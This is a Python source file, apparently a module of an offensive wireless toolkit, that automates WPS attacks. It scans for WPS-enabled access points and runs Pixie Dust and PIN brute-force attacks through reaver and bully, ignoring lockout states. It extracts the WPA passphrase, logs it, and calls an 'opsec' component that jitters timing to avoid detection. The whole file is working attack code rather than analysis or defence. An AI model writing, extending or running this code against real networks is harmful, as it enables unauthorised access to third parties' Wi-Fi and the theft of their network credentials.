"""WPS attack module — Pixie Dust and brute-force via reaver/bully."""

from __future__ import annotations

import re
import subprocess
import time
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("wps")


@dataclass
class WpsResult:
    success: bool
    pin: str | None = None
    password: str | None = None
    method: str = ""
    message: str = ""


@dataclass
class WpsTarget:
    bssid: str
    essid: str
    channel: int
    wps_version: str = ""
    wps_locked: bool = False


class WpsModule:
    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec

    def scan_wps(self, interface: str, duration: int = 30) -> list[WpsTarget]:
        console.print(f"[cyan]Scanning for WPS-enabled APs ({duration}s)...[/cyan]")
        self.opsec.pre_operation()

        try:
            result = subprocess.run(
                ["wash", "-i", interface, "-s", "-C"],
                capture_output=True, text=True, timeout=duration + 5,
            )
            output = result.stdout if result.returncode == 0 else ""
        except subprocess.TimeoutExpired as e:
            output = e.stdout or ""
        except FileNotFoundError:
            console.print("[red]wash not found — install reaver: sudo apt install reaver[/red]")
            return []

        targets: list[WpsTarget] = []

        for line in output.strip().split("\n"):
            if not line or line.startswith("Wash") or line.startswith("---") or line.startswith("BSSID"):
                continue
            parts = line.split()
            if len(parts) < 6:
                continue
            try:
                bssid = parts[0]
                channel = int(parts[1])
                wps_version = parts[3]
                locked = parts[4].lower() == "yes"
                essid = " ".join(parts[5:])

                targets.append(WpsTarget(
                    bssid=bssid, essid=essid, channel=channel,
                    wps_version=wps_version, wps_locked=locked,
                ))
            except (ValueError, IndexError):
                continue

        self._display_targets(targets)
        return targets

    def pixie_dust(
        self, interface: str, bssid: str, channel: int,
        timeout: int = 300,
    ) -> WpsResult:
        console.print(f"[cyan]Pixie Dust attack on {bssid} (ch{channel})...[/cyan]")
        self.opsec.pre_operation()
        log.info("Pixie Dust attack: %s ch%d", bssid, channel)

        for tool in ("reaver", "bully"):
            result = self._run_pixie(tool, interface, bssid, channel, timeout)
            if result.success:
                return result
            console.print(f"[yellow]{tool} pixie dust failed, trying next...[/yellow]")
            self.opsec.jitter(2.0)

        return WpsResult(success=False, method="pixie_dust", message="Pixie Dust failed with all tools")

    def brute_force(
        self, interface: str, bssid: str, channel: int,
        timeout: int = 3600,
    ) -> WpsResult:
        console.print(f"[cyan]WPS PIN brute-force on {bssid} (ch{channel})...[/cyan]")
        self.opsec.pre_operation()
        log.info("WPS brute-force: %s ch%d", bssid, channel)

        try:
            proc = subprocess.Popen(
                ["reaver",
                 "-i", interface,
                 "-b", bssid,
                 "-c", str(channel),
                 "-vv",
                 "-L",  # ignore locked state
                 "-N",  # no nacks
                 "-d", "2",  # delay between attempts
                 "-T", "1",  # timeout per attempt
                 ],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except FileNotFoundError:
            return WpsResult(success=False, method="brute_force", message="reaver not found")

        start = time.time()
        pin = None
        password = None

        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            TimeElapsedColumn(), console=console,
        ) as progress:
            task = progress.add_task("WPS brute-force (this can take hours)...", total=None)

            while proc.poll() is None and (time.time() - start) < timeout:
                line = proc.stdout.readline()
                if not line:
                    continue

                if "WPS PIN:" in line:
                    match = re.search(r"WPS PIN:\s*'?(\d+)'?", line)
                    if match:
                        pin = match.group(1)

                if "WPA PSK:" in line:
                    match = re.search(r"WPA PSK:\s*'(.+)'", line)
                    if match:
                        password = match.group(1)

                if pin and password:
                    break

                progress.update(task, description=f"WPS brute-force — {line.strip()[:60]}")

        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

        if pin:
            log.info("WPS PIN found: %s, password: %s", pin, password or "N/A")
            console.print(f"[green bold]WPS PIN: {pin}[/green bold]")
            if password:
                console.print(f"[green bold]Password: {password}[/green bold]")
            return WpsResult(
                success=True, pin=pin, password=password, method="brute_force",
            )

        return WpsResult(success=False, method="brute_force", message="Brute-force exhausted or timed out")

    def _run_pixie(
        self, tool: str, interface: str, bssid: str, channel: int, timeout: int,
    ) -> WpsResult:
        if tool == "reaver":
            cmd = [
                "reaver",
                "-i", interface,
                "-b", bssid,
                "-c", str(channel),
                "-K",  # Pixie Dust
                "-vv",
            ]
        elif tool == "bully":
            cmd = [
                "bully",
                interface,
                "-b", bssid,
                "-c", str(channel),
                "-d",  # Pixie Dust
                "-v", "3",
            ]
        else:
            return WpsResult(success=False, message=f"Unknown tool: {tool}")

        try:
            with Progress(
                SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                TimeElapsedColumn(), console=console,
            ) as progress:
                progress.add_task(f"Pixie Dust via {tool}...", total=None)

                result = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=timeout,
                )
        except FileNotFoundError:
            return WpsResult(success=False, method=f"pixie_{tool}", message=f"{tool} not found")
        except subprocess.TimeoutExpired:
            return WpsResult(success=False, method=f"pixie_{tool}", message="Timed out")

        output = result.stdout + result.stderr
        pin = None
        password = None

        pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", output)
        if pin_match:
            pin = pin_match.group(1)

        psk_match = re.search(r"WPA PSK:\s*'(.+)'", output)
        if psk_match:
            password = psk_match.group(1)

        if pin:
            log.info("Pixie Dust (%s) PIN: %s, password: %s", tool, pin, password or "N/A")
            console.print(f"[green bold]PIN found via {tool}: {pin}[/green bold]")
            if password:
                console.print(f"[green bold]Password: {password}[/green bold]")
            return WpsResult(
                success=True, pin=pin, password=password, method=f"pixie_{tool}",
            )

        return WpsResult(success=False, method=f"pixie_{tool}", message=f"{tool} did not recover PIN")

    def _display_targets(self, targets: list[WpsTarget]) -> None:
        from rich.table import Table
        table = Table(title="WPS-Enabled Access Points", show_lines=True)
        table.add_column("BSSID", style="cyan")
        table.add_column("ESSID", style="green")
        table.add_column("CH", justify="center")
        table.add_column("WPS Ver")
        table.add_column("Locked", justify="center")

        for t in targets:
            locked_style = "[red]YES[/red]" if t.wps_locked else "[green]no[/green]"
            table.add_row(t.bssid, t.essid, str(t.channel), t.wps_version, locked_style)

        console.print(table)
        console.print(f"[bold]{len(targets)} WPS targets found[/bold]")
